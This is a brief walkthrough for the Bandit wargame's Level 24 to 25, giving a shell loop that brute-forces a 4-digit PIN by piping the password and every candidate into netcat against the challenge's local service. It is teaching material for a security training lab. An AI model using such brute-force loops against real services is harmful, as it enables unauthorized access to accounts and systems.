# Bandit Level 24 → Level 25

This is the **4-digit PIN brute-force** level.

You know:

- the Level 24 password
- the service port
- the PIN is `0000`–`9999`

You can automate it:

```
for i in $(seq -w 0000 9999); do
    echo "$PASSWORD $i"
done | nc localhost <PORT>
```

Replace `$PASSWORD` with the actual Level 24 password and `<PORT>` with the port specified by the challenge.

A cleaner version:

```
for i in $(seq -w 0000 9999); do
    echo "YOUR_PASSWORD $i"
done | nc localhost 30002
```

Then search the output for the response that isn't the failure message.
